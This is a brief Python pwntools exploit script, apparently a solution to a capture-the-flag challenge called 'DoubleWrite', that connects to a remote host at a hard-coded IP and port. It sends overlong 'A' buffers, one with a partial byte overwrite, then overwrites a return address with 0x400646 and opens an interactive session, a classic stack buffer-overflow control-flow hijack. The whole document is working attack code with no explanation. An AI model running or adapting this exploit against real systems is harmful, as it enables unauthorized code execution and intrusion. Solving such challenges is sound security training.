from pwn import *

local = False
elf = 'DoubleWrite' 

if local: 
	context.binary = './'+elf
	r = process("./"+elf)
else: 
	ip = "140.114.77.172"
	port = 10000
	r = remote(ip,port)

payload = p64(0x400646, endian='little') 

print(r.recvuntil(':'))
r.send(('A'*0x9c)+'\xb0')
print(r.recvuntil(':'))
r.sendline(('A'*0xa8)+payload)
r.interactive()
